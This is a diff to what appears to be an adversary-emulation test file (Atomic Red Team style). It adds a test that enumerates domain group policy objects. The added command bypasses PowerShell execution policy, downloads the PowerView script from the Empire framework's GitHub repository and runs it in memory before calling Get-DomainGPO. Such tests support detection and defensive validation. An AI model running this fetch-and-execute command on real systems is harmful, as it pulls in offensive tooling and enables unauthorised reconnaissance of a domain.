@@ -16,3 +16,13 @@ atomic_tests:
     elevation_required: false
     command: |
       gpresult /z
+
+- name: Get-DomainGPO Display group policy information via PowerView
+  description: Use PowerView to Get-DomainGPO This will only work on Windows 10 Enterprise and A DC Windows 2019.
+  supported_platforms:
+  - windows
+  executor:
+    command: powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO"
+    name: powershell
+    elevation_required: true
+  
